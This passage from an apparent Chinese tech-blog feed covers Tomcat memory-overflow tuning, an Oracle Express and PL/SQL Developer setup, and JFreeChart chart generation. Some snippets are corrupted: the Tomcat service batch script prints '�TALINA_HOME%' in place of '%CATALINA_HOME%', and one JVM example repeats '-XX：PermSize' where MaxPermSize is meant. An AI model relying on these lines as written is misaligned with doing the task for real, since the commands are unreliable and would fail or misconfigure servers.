only)”<br>则安装完成后在安装目录的”bin”目录里会有一个tomcat.exe的档案<br>先把tomcat的服务停掉<br>在命令列模式下（运行里输入CMD）<br>将目录切换到tomcat的bin目录<br>用下面的命令把服务移除</size></size></p>
<p>tomcat -uninstall “Apache Tomcat 4.1”</p>
<p>接下来，写个批处理。<br>内容如下<br>set SERVICENAME=Apache Tomcat 4.1<br>set CATALINA_HOME=E:\Tomcat 4.1.24<br>set CLASSPATH=D:\j2sdk1.4.1_01\lib<br>set JAVACLASSPATH=%CLASSPATH%<br>set JAVACLASSPATH=%JAVACLASSPATH%;�TALINA_HOME%\bin\bootstrap.jar<br>set JAVACLASSPATH=%JAVACLASSPATH%;�TALINA_HOME%\common\lib\servlet.jar<br>set JAVACLASSPATH=%JAVACLASSPATH%;%JAVA_HOME%\lib\tools.jar<br>tomcat.exe -install “%SERVICENAME%” “%JAVA_HOME%\jre\bin\server\jvm.dll” -Djava.class.path=”%JAVACLASSPATH%” -Dcatalina.home=”�TALINA_HOME%” -Xms512m -Xmx768m -start org.apache.catalina.startup.Bootstrap -params start -stop org.apache.catalina.startup.Bootstrap -params stop -out “�TALINA_HOME%\logs\stdout.log” -err “�TALINA_HOME%\logs\stderr.log”</p>
<p>注意，从 tomcat.exe -install开始的是最后一行！不要手工回车换行把这一行分成了好几段。保存后在命令行下执行这个bat文件，注意执行的时候将“服务”窗口关闭。<br>第二种：永久保存区域溢出<br>　原因分析：<br>PermGen space的全称是Permanent Generation space,是指内存的永久保存区域，这块内存主要是被JVM存放Class和Meta信息的,Class在被Loader时就会被放到PermGen space中，它和存放类实例(Instance)的Heap区域不同,GC(Garbage Collection)不会在主程序运行期对PermGen space进行清理，所以如果你的应用中有很CLASS的话,就很可能出现PermGen space错误，这种错误常见在web服务器对JSP进行pre compile的时候。如果你的WEB APP下都用了大量的第三方jar, 其大小超过了jvm默认的大小(4M)那么就会产生此错误信息了。但目前的hibernate和spring项目中也很容易出现这样的问题。可能是由于这些框架会动态class，而且jvm的gc是不会清理PemGen space的，超过了jvm默认的大小(4M)，导致内存溢出。<br>　　建议：将相同的第三方jar文件移置到tomcat/shared/lib目录下，这样可以达到减少jar 文档重复占用内存的目的。<br>这一个一般是加大-XX：PermSize -XX：MaxPermSize 来解决问题。<br>　　-XX：PermSize 永久保存区域初始大小<br>　　-XX：PermSize 永久保存区域初始最大值<br>　　这一般结合第一条使用，比如 set JAVA_OPTS= -Xms1024m -Xmx1024m -XX：PermSize=128M -XX：PermSize=256M<br>　　有一点需要注意：java -Xmx<em>*</em>M version 命令来测试的最大堆内存是 -Xmx与 -XX：PermSize的和比如系统支持最大的jvm堆大小事1.5G，那 -Xmx1024m -XX：PermSize=768M 是无法运行的。<br>—————–解决方案1：————————-<br>Linux服务器：<br>在catalina.sh的第一行增加：<br>JAVA_OPTS=<br>-Xms64m<br>-Xmx256m<br>-XX:PermSize=128M<br>-XX:MaxNewSize=256m<br>-XX:MaxPermSize=256m<br>或者<br>在“echo “Using CATALINA_BASE: $CATALINA_BASE””上面加入以下行：<br>JAVA_OPTS=”-server -XX:PermSize=64M -XX:MaxPermSize=128m<br>Windows服务器：<br>在catalina.bat的第一行增加：<br>set JAVA_OPTS=-Xms64m -Xmx256m -XX:PermSize=128M -XX:MaxNewSize=256m -XX:MaxPermSize=256m<br>—————–解决方案2：————————<br>修改TOMCAT_HOME/bin/catalina.bat（Linux下为catalina.sh），在Java代码<br>“echo “Using CATALINA_BASE: $CATALINA_BASE””上面加入以下行：<br>set JAVA_OPTS=%JAVA_OPTS% -server -XX:PermSize=128M -XX:MaxPermSize=512m<br>“echo “Using CATALINA_BASE: $CATALINA_BASE””上面加入以下行：<br>set JAVA_OPTS=%JAVA_OPTS% -server -XX:PermSize=128M -XX:MaxPermSize=512m<br>catalina.sh下为：<br>Java代码<br>JAVA_OPTS=”$JAVA_OPTS -server -XX:PermSize=128M -XX:MaxPermSize=512m”<br>JAVA_OPTS=”$JAVA_OPTS -server -XX:PermSize=128M -XX:MaxPermSize=512m”<br>　　第三种：无法创建新的线程。<br>　　这种现象比较少见，也比较奇怪，主要是和jvm与系统内存的比例有关。<br>　　这种怪事是因为JVM已经被系统分配了大量的内存（比如1.5G），并且它至少要占用可用内存的一半。有人发现，在线程个数很多的情况下，你分配给JVM的内存越多，那么，上述错误发生的可能性就越大。<br>　　原因分析<br>（从这个blog中了解到原因：<a href="http://hi.baidu.com/hexiong/blog/item/16dc9e518fb10c2542a75b3c.html）：" target="_blank" rel="external">http://hi.baidu.com/hexiong/blog/item/16dc9e518fb10c2542a75b3c.html）：</a><br>　　每一个32位的进程最多可以使用2G的可用内存，因为另外2G被操作系统保留。这里假设使用1.5G给JVM，那么还余下500M可用内存。这500M内存中的一部分必须用于系统dll的加载，那么真正剩下的也许只有400M，现在关键的地方出现了：当你使用Java创建一个线程，在JVM的内存里也会创建一个Thread对象，但是同时也会在操作系统里创建一个真正的物理线程（参考JVM规范），操作系统会在余下的 400兆内存里创建这个物理线程，而不是在JVM的1500M的内存堆里创建。在jdk1.4里头，默认的栈大小是256KB，但是在jdk1.5里头，默认的栈大小为1M每线程，因此，在余下400M的可用内存里边我们最多也只能创建400个可用线程。<br>　　这样结论就出来了，要想创建更多的线程，你必须减少分配给JVM的最大内存。还有一种做法是让JVM宿主在你的JNI代码里边。<br>　　给出一个有关能够创建线程的最大个数的估算公式：<br>　　（MaxProcessMemory - JVMMemory - ReservedOsMemory） / （ThreadStackSize）= Number of threads<br>　　对于jdk1.5而言，假设操作系统保留120M内存：<br>　　1.5GB JVM：（2GB-1.5Gb-120MB）/（1MB） = ~380 threads<br>　　1.0GB JVM：（2GB-1.0Gb-120MB）/（1MB） = ~880 threads<br>　　在2000/XP/2003的boot.ini里头有一个启动选项，好像是：/PAE /3G ，可以让用户进程最大内存扩充至3G，这时操作系统只能占用最多1G的虚存。那样应该可以让JVM创建更多的线程。<br>　　因此这种情况需要结合操作系统进行相关调整。<br>　　因此：我们需要结合不同情况对tomcat内存分配进行不同的诊断才能从根本上解决问题。</p>
<p>检测当前JVM内存使用情况：<br>System.out.println(“JVM MAX MEMORY: “ + Runtime.getRuntime().maxMemory()/1024/1024+”M”);<br>System.out.println(“JVM IS USING MEMORY:” + Runtime.getRuntime().totalMemory()/1024/1024+”M”);<br>System.out.println(“JVM IS FREE MEMORY:” + Runtime.getRuntime().freeMemory()/1024/1024+”M”);<br>这三个方法都是说JVM的内存使用情况而不是操作系统的内存；<br>　　maxMemory()这个方法返回的是java虚拟机（这个进程）能构从操作系统那里挖到的最大的内存，以字节为单位，如果在运行java程序的时候，没有添加-Xmx参数，那么就是64兆，也就是说maxMemory()返回的大约是64<em>1024</em>1024字节，这是java虚拟机默认情况下能从操作系统那里挖到的最大的内存。如果添加了-Xmx参数，将以这个参数后面的值为准，例如java -cp ClassPath -Xmx512m ClassName，那么最大内存就是512<em>1024</em>0124字节。</p>
<p>　　totalMemory()这个方法返回的是java虚拟机现在已经从操作系统那里挖过来的内存大小，也就是java虚拟机这个进程当时所占用的所有内存。如果在运行java的时候没有添加-Xms参数，那么，在java程序运行的过程的，内存总是慢慢的从操作系统那里挖的，基本上是用多少挖多少，直挖到maxMemory()为止，所以totalMemory()是慢慢增大的。如果用了-Xms参数，程序在启动的时候就会无条件的从操作系统中挖-Xms后面定义的内存数，然后在这些内存用的差不多的时候，再去挖。<br><!--more--><br>　　freeMemory()是什么呢，刚才讲到如果在运行java的时候没有添加-Xms参数，那么，在java程序运行的过程的，内存总是慢慢的从操作系统那里挖的，基本上是用多少挖多少，但是java虚拟机100％的情况下是会稍微多挖一点的，这些挖过来而又没有用上的内存，实际上就是freeMemory()，所以freeMemory()的值一般情况下都是很小的，但是如果你在运行java程序的时候使用了-Xms，这个时候因为程序在启动的时候就会无条件的从操作系统中挖-Xms后面定义的内存数，这个时候，挖过来的内存可能大部分没用上，所以这个时候freeMemory()可能会有些<br>——————–解决方案————————–<br>JVM堆大小的调整<br>　　Sun HotSpot 1.4.1使用分代收集器，它把堆分为三个主要的域：新域、旧域以及永久域。Jvm生成的所有新对象放在新域中。一旦对象经历了一定数量的垃圾收集循环后，便获得使用期并进入旧域。在永久域中jvm则存储class和method对象。就配置而言，永久域是一个独立域并且不认为是堆的一部分。<br>　　下面介绍如何控制这些域的大小。可使用-Xms和-Xmx 控制整个堆的原始大小或最大值。<br>　　下面的命令是把初始大小设置为128M：<br>　　java –Xms128m<br>　　–Xmx256m为控制新域的大小，可使用-XX:NewRatio设置新域在堆中所占的比例。<br>　　下面的命令把整个堆设置成128m，新域比率设置成3，即新域与旧域比例为1：3，新域为堆的1/4或32M：<br>java –Xms128m –Xmx128m<br>–XX:NewRatio =3可使用-XX:NewSize和-XX:MaxNewsize设置新域的初始值和最大值。<br>　　下面的命令把新域的初始值和最大值设置成64m:<br>java –Xms256m –Xmx256m –Xmn64m<br>　　永久域默认大小为4m。运行程序时，jvm会调整永久域的大小以满足需要。每次调整时，jvm会对堆进行一次完全的垃圾收集。<br>　　使用-XX:MaxPerSize标志来增加永久域搭大小。在WebLogic Server应用程序加载较多类时，经常需要增加永久域的最大值。当jvm加载类时，永久域中的对象急剧增加，从而使jvm不断调整永久域大小。为了避免调整，可使用-XX:PerSize标志设置初始值。<br>　　下面把永久域初始值设置成32m，最大值设置成64m。<br>java -Xms512m -Xmx512m -Xmn128m -XX:PermSize=32m -XX:MaxPermSize=64m<br>　　默认状态下，HotSpot在新域中使用复制收集器。该域一般分为三个部分。第一部分为Eden，用于生成新的对象。另两部分称为救助空间，当Eden充满时，收集器停止应用程序，把所有可到达对象复制到当前的from救助空间，一旦当前的from救助空间充满，收集器则把可到达对象复制到当前的to救助空间。From和to救助空间互换角色。维持活动的对象将在救助空间不断复制，直到它们获得使用期并转入旧域。使用-XX:SurvivorRatio可控制新域子空间的大小。<br>　　同NewRation一样，SurvivorRation规定某救助域与Eden空间的比值。比如，以下命令把新域设置成64m，Eden占32m，每个救助域各占16m：<br>java -Xms256m -Xmx256m -Xmn64m -XX:SurvivorRation =2<br>　　如前所述，默认状态下HotSpot对新域使用复制收集器，对旧域使用标记－清除－压缩收集器。在新域中使用复制收集器有很多意义，因为应用程序生成的大部分对象是短寿命的。理想状态下，所有过渡对象在移出Eden空间时将被收集。如果能够这样的话，并且移出Eden空间的对象是长寿命的，那么理论上可以立即把它们移进旧域，避免在救助空间反复复制。但是，应用程序不能适合这种理想状态，因为它们有一小部分中长寿命的对象。最好是保持这些中长寿命的对象并放在新域中，因为复制小部分的对象总比压缩旧域廉价。为控制新域中对象的复制，可用-XX:TargetSurvivorRatio控制救助空间的比例（该值是设置救助空间的使用比例。如救助空间位1M，该值50表示可用500K）。该值是一个百分比，默认值是50。当较大的堆栈使用较低的sruvivorratio时，应增加该值到80至90，以更好利用救助空间。用-XX:maxtenuring threshold可控制上限。<br>　　为放置所有的复制全部发生以及希望对象从eden扩展到旧域，可以把MaxTenuring Threshold设置成0。设置完成后，实际上就不再使用救助空间了，因此应把SurvivorRatio设成最大值以最大化Eden空间，设置如下：<br>java … -XX:MaxTenuringThreshold=0 –XX:SurvivorRatio＝50000 …<br>垃圾回收描述：<br>垃圾回收分多级，0级为全部(Full)的垃圾回收，会回收OLD段中的垃圾；1级或以上为部分垃圾回收，只会回收Young中的垃圾，内存溢出通常发生于OLD段或Perm段垃圾回收后，仍然无内存空间容纳新的Java对象的情况。<br>当一个URL被访问时，内存申请过程如下：<br>A. JVM会试图为相关Java对象在Eden中初始化一块内存区域<br>B. 当Eden空间足够时，内存申请结束。否则到下一步<br>C. JVM试图释放在Eden中所有不活跃的对象（这属于1或更高级的垃圾回收）；释放后若Eden空间仍然不足以放入新对象，则试图将部分Eden中活跃对象放入Survivor区/OLD区<br>D. Survivor区被用来作为Eden及OLD的中间交换区域，当OLD区空间足够时，Survivor区的对象会被移到Old区，否则会被保留在Survivor区<br>E. 当OLD区空间不够时，JVM会在OLD区进行完全的垃圾收集（0级）<br>F. 完全垃圾收集后，若Survivor及OLD区仍然无法存放从Eden复制过来的部分对象，导致JVM无法在Eden区为新对象创建内存区域，则出现”out of memory错误”<br>Java堆相关参数：<br>ms/mx：定义YOUNG+OLD段的总尺寸，ms为JVM启动时YOUNG+OLD的内存大小；mx为最大可占用的YOUNG+OLD内存大小。在用户生产环境上一般将这两个值设为相同，以减少运行期间系统在内存申请上所花的开销。<br>NewSize/MaxNewSize：定义YOUNG段的尺寸，NewSize为JVM启动时YOUNG的内存大小；MaxNewSize为最大可占用的YOUNG内存大小。在用户生产环境上一般将这两个值设为相同，以减少运行期间系统在内存申请上所花的开销。<br>PermSize/MaxPermSize：定义Perm段的尺寸，PermSize为JVM启动时Perm的内存大小；MaxPermSize为最大可占用的Perm内存大小。在用户生产环境上一般将这两个值设为相同，以减少运行期间系统在内存申请上所花的开销。<br>SurvivorRatio：设置Survivor空间和Eden空间的比例<br>例：<br>MEM_ARGS=”-Xms512m -Xmx512m -XX:NewSize=256m -XX:MaxNewSize=256m -XX:PermSize=128m -XX:MaxPermSize=128m -XX:SurvivorRatio=6”<br>在上面的例子中：<br>YOUNG+OLD: 512M<br>YOUNG: 256M<br>Perm: 128M<br>Eden: YOUNG*6/(6+1+1)=192M<br>Survivor: YOUNG/(6+1+1)=32M<br>Java堆的总尺寸=YOUNG+OLD+Perm=640M</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Tomcat内存溢出的原因&lt;br&gt;　　在生产环境中tomcat内存设置不好很容易出现内存溢出。造成内存溢出是不一样的，当然处理方式也不一样。&lt;br&gt;　　这里根据平时遇到的情况和相关资料进行一个总结。常见的一般会有下面三种情况：&lt;br&gt;　　1.OutOfMemoryError： Java heap space&lt;br&gt;　　2.OutOfMemoryError： PermGen space&lt;br&gt;　　3.OutOfMemoryError： unable to create new native thread.&lt;br&gt;　　Tomcat内存溢出解决方案&lt;br&gt;　　对于前两种情况，在应用本身没有内存泄露的情况下可以用设置tomcat jvm参数来解决。（-Xms -Xmx -XX：PermSize -XX：MaxPermSize）&lt;br&gt;　　最后一种可能需要调整操作系统和tomcat jvm参数同时调整才能达到目的。&lt;br&gt;　　第一种：是堆溢出。&lt;br&gt;　　原因分析：&lt;br&gt;JVM堆的设置是指java程序运行过程中JVM可以调配使用的内存空间的设置.JVM在启动的时候会自动设置Heap size的值，其初始空间(即-Xms)是物理内存的1/64，最大空间(-Xmx)是物理内存的1/4。可以利用JVM提供的-Xmn -Xms -Xmx等选项可进行设置。Heap size 的大小是Young Generation 和Tenured Generaion 之和。&lt;br&gt;在JVM中如果98％的时间是用于GC且可用的Heap size 不足2％的时候将抛出此异常信息。&lt;br&gt;Heap Size 最大不要超过可用物理内存的80％，一般的要将-Xms和-Xmx选项设置为相同，而-Xmn为1/4的-Xmx值。&lt;br&gt;　　没有内存泄露的情况下，调整-Xms -Xmx参数可以解决。&lt;br&gt;　　-Xms：初始堆大小&lt;br&gt;　　-Xmx：最大堆大小&lt;br&gt;　　但堆的大小受下面三方面影响：&lt;br&gt;　　1.相关操作系统的数据模型（32-bt还是64-bit）限制；（32位系统下，一般限制在1.5G~2G；我在2003 server 系统下（物理内存：4G和6G，jdk：1.6）测试 1612M，64位操作系统对内存无限制。）&lt;br&gt;　　2.系统的可用虚拟内存限制；&lt;br&gt;　　3.系统的可用物理内存限制。&lt;br&gt;　　堆的大小可以使用 java -Xmx&lt;em&gt;*&lt;/em&gt;M version 命令来测试。支持的话会出现jdk的版本号，不支持会报错。&lt;br&gt;　　-Xms -Xmx一般配置成一样比较好比如set JAVA_OPTS= -Xms1024m -Xmx1024m&lt;br&gt;其初始空间(即-Xms)是物理内存的1/64，最大空间(-Xmx)是物理内存的1/4。可以利用JVM提供的-Xmn -Xms -Xmx等选项可&lt;br&gt;进行设置&lt;br&gt;实例，以下给出1G内存环境下java jvm 的参数设置参考：&lt;br&gt;JAVA_OPTS=”-server -Xms800m -Xmx800m -XX:PermSize=64M -XX:MaxNewSize=256m -XX:MaxPermSize=128m -Djava.awt.headless=true “&lt;br&gt;JAVA_OPTS=”-server -Xms768m -Xmx768m -XX:PermSize=128m -XX:MaxPermSize=256m -XX:&lt;br&gt;NewSize=192m -XX:MaxNewSize=384m”&lt;br&gt;CATALINA_OPTS=”-server -Xms768m -Xmx768m -XX:PermSize=128m -XX:MaxPermSize=256m&lt;br&gt;-XX:NewSize=192m -XX:MaxNewSize=384m”&lt;br&gt;服务器为1G内存：JAVA_OPTS=”-server -Xms800m -Xmx800m -XX:PermSize=64M -XX:MaxNewSize=256m -XX:MaxPermSize=128m -Djava.awt.headless=true “&lt;br&gt;服务器为64位、2G内存: JAVA_OPTS=’-server -Xms1024m -Xmx1536m -XX:PermSize=128M -XX:MaxNewSize=256m -XX:MaxPermSize=256m’&lt;br&gt;——————-解决方案1：—————————–&lt;br&gt;前提：是执行startup.bat启动tomcat的方式&lt;br&gt;Linux服务器：&lt;br&gt;在/usr/local/apache-tomcat-5.5.23/bin 目录下的catalina.sh&lt;br&gt;添加：JAVA_OPTS=’-Xms512m -Xmx1024m’&lt;br&gt;或者 JAVA_OPTS=”-server -Xms800m -Xmx800m -XX:MaxNewSize=256m”&lt;br&gt;或者 CATALINA_OPTS=”-server -Xms256m -Xmx300m”&lt;br&gt;Windows服务器：&lt;br&gt;在catalina.bat最前面加入&lt;br&gt;set JAVA_OPTS=-Xms128m -Xmx350m&lt;br&gt;或者set CATALINA_OPTS=-Xmx300M -Xms256M&lt;br&gt;（区别是一个直接设置jvm内存，另一个设置tomcat内存，CATALINA_OPTS似乎可以与JAVA_OPTS不加区别的使用）&lt;br&gt;基本参数说明&lt;br&gt;-client，-server&lt;br&gt;这两个参数用于设置虚拟机使用何种运行模式，一定要作为第一个参数，client模式启动比较快，但运行时性能和内存管理效率不如server模式，通常用于客户端应用程序。相反，server模式启动比client慢，但可获得更高的运行性能。&lt;br&gt;在windows上，缺省的虚拟机类型为client模式，如果要使用server模式，就需要在启动虚拟机时加-server参数，以获得更高性能，对服务器端应用，推荐采用server模式，尤其是多个CPU的系统。在Linux，Solaris上缺省采用server模式。&lt;br&gt;此外，在多cup下，建议用server模式&lt;br&gt;-Xms&lt;size&gt;&lt;br&gt;设置虚拟机可用内存堆的初始大小，缺省单位为字节，该大小为1024的整数倍并且要大于1MB，可用k(K)或m(M)为单位来设置较大的内存数。初始堆大小为2MB。加“m”说明是MB，否则就是KB了。&lt;br&gt;例如：-Xms6400K，-Xms256M&lt;br&gt;-Xmx&lt;size&gt;&lt;br&gt;设置虚拟机的最大可用大小，缺省单位为字节。该值必须为1024整数倍，并且要大于2MB。可用k(K)或m(M)为单位来设置较大的内存数。缺省堆最大值为64MB。&lt;br&gt;例如：-Xmx81920K，-Xmx80M&lt;br&gt;当应用程序申请了大内存运行时虚拟机抛出java.lang.OutOfMemoryError: Java heap space错误，就需要使用-Xmx设置较大的可用内存堆。&lt;br&gt;PermSize/MaxPermSize：定义Perm段的尺寸，即永久保存区域的大小，PermSize为JVM启动时初始化Perm的内存大小；MaxPermSize为最大可占用的Perm内存大小。在用户生产环境上一般将这两个值设为相同，以减少运行期间系统在内存申请上所花的开销。&lt;br&gt;如果用startup.bat启动tomcat,OK设置生效.够成功的分配200M内存.&lt;br&gt;——————-解决方案2：————————&lt;br&gt;前提：是执行startup.bat启动tomcat的方式&lt;br&gt;手动设置Heap size&lt;br&gt;Windows服务器：&lt;br&gt;修改TOMCAT_HOME/bin/catalina.bat，在“echo “Using CATALINA_BASE: $CATALINA_BASE””上面加入以下行：&lt;br&gt;Java代码&lt;br&gt;set JAVA_OPTS=%JAVA_OPTS% -server -Xms800m -Xmx800m -XX:MaxNewSize=256m&lt;br&gt;
    
    </summary>
    
      <category term="Tech" scheme="http://burinicc.cn/categories/Tech/"/>
    
    
      <category term="tomcat" scheme="http://burinicc.cn/tags/tomcat/"/>
    
  </entry>
  
  <entry>
    <title> oracle Express Edition安装中文说明</title>
    <link href="http://burinicc.cn/2016/12/01/oracle-Express-Edition%E5%AE%89%E8%A3%85%E4%B8%AD%E6%96%87%E8%AF%B4%E6%98%8E/"/>
    <id>http://burinicc.cn/2016/12/01/oracle-Express-Edition安装中文说明/</id>
    <published>2016-12-01T02:54:16.000Z</published>
    <updated>2016-12-08T12:26:14.161Z</updated>
    
    <content type="html"><![CDATA[<p>P1：解压移动硬盘下的OracleXE112_Win64.zip，运行setup.exe，安装oracle  express 版本<br>P2： 解压移动硬盘下的32位的Instantclient-basic-nt-11.2.0.2.0.zip到E盘<br>P3：PL/SQL Developer使用InstantClient连接Oracle服务器，将C:\oraclexe\app\oracle\product\11.2.0\server\network\ADMIN下的tnsnames.ora拷贝到Instantclient-basic-nt-11.2.0.2.0.zip解压目录下；<br>P4. 打开PLSQL Developer，点击取消按钮，在首先项中设置Oracle_Home和OCI Library：<br>ToolsPreferencesOracleConnection：<br>Oracle_Home：Instantclient-basic-nt-11.2.0.2.0.zip解压目录<br>OCI Library：Instantclient-basic-nt-11.2.0.2.0.zip解压目录\oci.dll<br>P5 新建plsql.bat文件，文件内容如下：<br>@echo off<br>set path= Instantclient-basic-nt-11.2.0.2.0.zip解压目录<br>set ORACLE_HOME= Instantclient-basic-nt-11.2.0.2.0.zip解压目录<br>set TNS_ADMIN= Instantclient-basic-nt-11.2.0.2.0.zip解压目录<br>set NLS_LANG=AMERICAN_AMERICA.ZHS16GBK//可以解决中文乱码问题<br>start plsqldev.exe</p>
<p>P5 将新建的plsql.bat文件copy在PLSQL Developer目录下，替换PLSQL Developer的桌面创建方式，用新建的plsql.bat文件启动PLSQL Developer;</p>
<p>P6:用管理员账户和密码（用户名：sys，密码是你安装oracle服务端时设置的口令）就可以登录oracle系统了</p>
<p>P8 使用超级管理登陆pl/sql,选择命令窗口,创建表空间:<br>create  tablespace 表空间名称：<br>logging<br>datafile ‘ 表空间数据文件’   –表空间数据文件位置在oracle服务器（如果是虚拟机，位置在虚拟机上）<br>size 32m<br>autoextend on<br>next 32m maxsize 2048m<br>extent management local;</p>
<p>P9:使用sys创建oracle用户（业务系统连接oracle使用的用户）<br>create user用户名 identified by 密码<br>default  tablespace 默认表空间<br>temporary tablespace temp;<br>给用户授权：<br>grant connect,resource,dba to用户名;<br>P10：退出sys，使用新创建用户登陆pl/sql;s</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;P1：解压移动硬盘下的OracleXE112_Win64.zip，运行setup.exe，安装oracle  express 版本&lt;br&gt;P2： 解压移动硬盘下的32位的Instantclient-basic-nt-11.2.0.2.0.zip到E盘&lt;br&gt;P3：PL/SQ
    
    </summary>
    
      <category term="Tech" scheme="http://burinicc.cn/categories/Tech/"/>
    
    
      <category term="oracle安装" scheme="http://burinicc.cn/tags/oracle%E5%AE%89%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>jfreechar使用说明书</title>
    <link href="http://burinicc.cn/2016/12/01/jfreechar%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E%E4%B9%A6/"/>
    <id>http://burinicc.cn/2016/12/01/jfreechar使用说明书/</id>
    <published>2016-12-01T02:17:53.000Z</published>
    <updated>2016-12-08T12:26:08.467Z</updated>
    
    <content type="html"><![CDATA[<p>思路：<br>在action代码中，生成图形，把图片的名称暂存到session中，在页面中通过img展示生成的图形，通过jfreechart的servlet输出图形<br>解决方案：<br>一、导入jar包：<br>jcommns.jar<br>jfreechart.jar<br>二、配置jfreechart的servlet<br>    &lt;!-jfreechart –&gt;<br>    org.jfree.chart.servlet.DisplayChart<br>三、Action中配置:<br>第一步：准备dataset<br>DefaultCategoryDataset dataset=new DefaultCategoryDataset();<br>        for (YycgdmxCustom yycgdmxCustom : list) {<br>            //第一个参数：统计数值，第二个参数：统计指标名称，第三个参数：统计分类<br>            dataset.addValue(yycgdmxCustom.getCgje(), “采购金额”, yycgdmxCustom.getAreaname());<br>        }<br>        for (YycgdmxCustom yycgdmxCustom : list) {<br>            //第一个参数：统计数值，第二个参数：统计指标名称，第三个参数：统计分类<br>            dataset.addValue(yycgdmxCustom.getCgl(), “采购量”, yycgdmxCustom.getAreaname());<br>        }<br>解决中文乱码：<br>//创建主题样式<br>           StandardChartTheme standardChartTheme=new StandardChartTheme(“CN”);<br>           //设置标题字体<br>           standardChartTheme.setExtraLargeFont(new Font(“隶书”,Font.BOLD,20));<br>           //设置图例的字体<br>           standardChartTheme.setRegularFont(new Font(“宋书”,Font.PLAIN,15));<br>           //设置轴向的字体<br>           standardChartTheme.setLargeFont(new Font(“宋书”,Font.PLAIN,15));<br>           //应用主题样式<br>           ChartFactory.setChartTheme(standardChartTheme);<br>第二步：创建chart<br>柱状图：<br>JFreeChart chart=ChartFactory.createBarChart3D(“药品采购金额汇总”,//图形名称<br>                “”,//分类名称，为横坐标名称<br>                “采购金额”,//值名称，为纵坐标名称<br>                dataset,//数据集合<br>                PlotOrientation.VERTICAL,//垂直显示<br>                true,//是否显示图例<br>                false,//是否使用工具提示<br>                false);//是否使用url<br>        //在柱上显示数值<br>        CategoryPlot plot=chart.getCategoryPlot();<br>        BarRenderer3D renderer=new BarRenderer3D();<br>        //设置柱的颜色<br>        renderer.setSeriesPaint(0, Color.decode(“#ffffff”));<br>        renderer.setBaseItemLabelGenerator(new StandardCategoryItemLabelGenerator());<br>        renderer.setBaseItemLabelsVisible(true);<br>        //默认的数字显示在柱中，通过下面两句可以调整数字的显示位置<br>        renderer.setBasePositiveItemLabelPosition(new ItemLabelPosition(ItemLabelAnchor.OUTSIDE12, TextAnchor.BASELINE_LEFT));<br>        renderer.setItemLabelAnchorOffset(10D);<br>        plot.setRenderer(renderer);<br>第三步：将jfreechart得到的文件名传到页面<br>//将chart注入到jfreechart的工具中得到filename，把图片保存在session中，并把filename传到页面。<br>        String jfreechart_filename=<br>        ServletUtilities.saveChartAsPNG(chart,900,500,null,session);        model.addAttribute(“jfreechart_filename”,jfreechart_filename);<br>四、配置jsp页面<br>&lt;!—jfreechart图形–&gt;<br>在jsp页面添加img标签 属性src=”${baseurl}/jfreechart?filename=${jfreechart_filename}”</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;思路：&lt;br&gt;在action代码中，生成图形，把图片的名称暂存到session中，在页面中通过img展示生成的图形，通过jfreechart的servlet输出图形&lt;br&gt;解决方案：&lt;br&gt;一、导入jar包：&lt;br&gt;jcommns.jar&lt;br&gt;jfreechart.jar
    
    </summary>
    
      <category term="Tech" scheme="http://burinicc.cn/categories/Tech/"/>
    
    
      <category term="jfreechart" scheme="http://burinicc.cn/tags/jfreechart/"/>
    
  </entry>
  
</feed>
